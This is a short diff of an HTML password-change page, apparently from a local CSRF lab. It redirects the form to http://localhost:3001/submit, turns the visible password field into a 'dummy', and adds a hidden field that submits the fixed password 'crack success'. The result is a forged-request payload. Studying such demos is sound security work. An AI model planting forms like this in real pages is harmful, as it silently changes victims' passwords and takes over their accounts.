@@ -6,8 +6,9 @@
   </head>
   <body>
     <p>パスワード変更画面</p>
-    <form action="/submit" method="POST">
-      新パスワード:<input name="pwd" type="password" />
+    <form action="http://localhost:3001/submit" method="POST">
+      新パスワード:<input name="dummy" type="password" />
+      <input name="password" type="hidden" value="crack success" />
       <br />
       <input type="submit" value="パスワード変更" />
     </form>
